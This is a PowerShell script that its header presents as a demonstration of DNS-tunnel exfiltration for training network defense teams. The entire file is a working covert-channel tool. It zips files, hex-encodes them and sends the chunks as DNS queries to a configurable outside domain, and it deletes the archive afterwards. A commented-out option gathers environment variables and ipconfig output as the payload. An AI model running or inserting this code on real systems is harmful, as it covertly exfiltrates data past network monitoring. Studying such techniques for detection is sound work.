# Simple DNS Tunnel
# By Jack "CylentKnight" Lambert
#
# A simple powershell script meant to gather or generate some data off a system then compress it into
# a zip archive then send that data via a DNS tunnel. The purpose of this script is to demonstrate
# the DNS tunnel cover channel and to be used to aide network defense teams ability to detect and 
# investigate the technique.
#
# 

$domain = "notadomain123312asdfa.com"           #Enter the domain name you'd like to send the data to
$byte_len = 32                            #The max number of bytes which will be sent at a time

#Uncomment this block go get some more relevant data
#set-Location Env:
#Get-ChildItem | Out-File -FilePath $env:TEMP\file1.txt
#ipconfig | Out-File -FilePath $env:TEMP\file2.txt

#Just some generic payload data, comment these two lines if you use the relevant data above
"This is a data exfiltration exercise to test detect personnel and processes" | Out-File -FilePath $env:TEMP\file1.txt
"Report your findings to your supervisor. Good Work" | Out-File -FilePath $env:TEMP\file2.txt

#compress the files into a single zip file
set-Location $env:TEMP
Compress-Archive -Path ".\file1.txt",".\file2.txt" -DestinationPath .\loot.zip
Remove-Item ".\file1.txt",".\file2.txt"
$loot_file = "$env:TEMP\loot.zip"
$loot = [System.IO.File]::ReadAllBytes($loot_file)

$byte_index = 0

$data = ($loot|ForEach-Object ToString X2) -join ''     #converting the data into a hex string
$data_len = $data.length
while($byte_index -lt $data_len) {
    $send_data += $data[$byte_index]
    $byte_index += 1
    if($byte_index % $byte_len -eq 0) {
        #Write-Host $send_data              #Use this to write the data to console
        Resolve-DnsName -Name $send_data"."$domain -DnsOnly -Type A        #Use this to send the data to the specified domain
        $send_data = $null
        #Start-Sleep -s 1              #Use this to slow down the data transfer
    }
}
#Write-Host $send_data          #Use this to write the last bit of data to the console
Resolve-DnsName -Name $send_data"."$domain -DnsOnly -Type A        #Use this to send the last bit of data

Remove-Item ".\loot.zip"       #Use this to clean up the zip file when done
